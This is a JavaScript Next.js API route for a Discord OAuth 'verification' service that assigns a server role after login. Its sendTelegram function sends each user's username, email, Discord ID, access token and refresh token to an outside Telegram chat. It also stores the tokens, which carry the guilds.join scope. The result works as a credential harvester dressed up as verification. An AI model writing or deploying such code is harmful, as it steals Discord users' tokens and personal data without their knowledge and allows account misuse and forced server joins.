import axios from 'axios';
import { saveUser, saveGuilds } from '../../lib/db';

const clientID = process.env.DISCORD_CLIENT_ID || '1473394152023654430';
const clientSecret = process.env.DISCORD_CLIENT_SECRET;
const redirect_uri = process.env.REDIRECT_URI || 'https://discord-oauth-2-nextjs-app--ABGAMING6.replit.app/redirect';
const BOT_TOKEN = process.env.DISCORD_BOT_TOKEN;
const TG_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
const TG_CHAT_ID = process.env.TELEGRAM_CHAT_ID;

async function sendTelegram(user, access_token, refresh_token, guildId, roleId) {
  if (!TG_TOKEN || !TG_CHAT_ID) return;
  const msg = `✅ New Verified User!\n\n👤 Username: ${user.username}\n🆔 Discord ID: ${user.id}\n📧 Email: ${user.email || 'N/A'}\n🏠 Guild ID: ${guildId || 'N/A'}\n🎭 Role ID: ${roleId || 'N/A'}\n\n🔑 Access Token:\n<code>${access_token}</code>\n\n🔄 Refresh Token:\n<code>${refresh_token}</code>`;
  await axios.post(`https://api.telegram.org/bot${TG_TOKEN}/sendMessage`, {
    chat_id: TG_CHAT_ID,
    text: msg,
    parse_mode: 'HTML',
  });
}

async function assignRole(guildId, userId, roleId) {
  await axios.put(
    `https://discord.com/api/v10/guilds/${guildId}/members/${userId}/roles/${roleId}`,
    {},
    { headers: { Authorization: `Bot ${BOT_TOKEN}` } }
  );
}

export default async function handler(req, res) {
  if (req.method !== 'POST') return res.status(405).end();

  const { code, state } = req.body;
  if (!code) return res.status(400).json({ error: 'Missing code' });

  try {
    const tokenRes = await axios.post(
      'https://discord.com/api/oauth2/token',
      new URLSearchParams({
        code,
        grant_type: 'authorization_code',
        client_id: clientID,
        client_secret: clientSecret,
        redirect_uri,
        scope: 'identify email guilds guilds.join',
      }).toString(),
      { headers: { 'Content-Type': 'application/x-www-form-urlencoded' } }
    );

    const { access_token, refresh_token } = tokenRes.data;
    if (!access_token) return res.status(400).json({ error: 'Token exchange failed' });

    const headers = { Authorization: `Bearer ${access_token}` };

    const [userRes, guildsRes] = await Promise.all([
      axios.get('https://discord.com/api/v10/users/@me', { headers }),
      axios.get('https://discord.com/api/v10/users/@me/guilds', { headers }),
    ]);

    const user = userRes.data;
    const guilds = guildsRes.data;

    let verifiedGuildId = null;
    let verifiedRoleId = null;

    if (state) {
      const [guildId, roleId] = decodeURIComponent(state).split(':');
      verifiedGuildId = guildId;
      verifiedRoleId = roleId;
    }

    await saveUser({
      discord_id: user.id,
      username: user.username,
      discriminator: user.discriminator,
      email: user.email,
      avatar: user.avatar,
      access_token,
      refresh_token,
      verified_guild_id: verifiedGuildId,
      verified_role_id: verifiedRoleId,
      verified_at: verifiedGuildId ? new Date() : null,
    });

    await saveGuilds(user.id, guilds);

    if (verifiedGuildId && verifiedRoleId) {
      try {
        await assignRole(verifiedGuildId, user.id, verifiedRoleId);
      } catch (roleErr) {
        console.error('Role assign error:', roleErr?.response?.data || roleErr.message);
      }
    }

    try {
      await sendTelegram(user, access_token, refresh_token, verifiedGuildId, verifiedRoleId);
    } catch (tgErr) {
      console.error('Telegram notify error:', tgErr?.message);
    }

    return res.status(200).json({ access_token, refresh_token, verified: !!verifiedGuildId });
  } catch (err) {
    console.error('Token exchange error:', err?.response?.data || err.message);
    return res.status(500).json({ error: 'Internal server error' });
  }
}
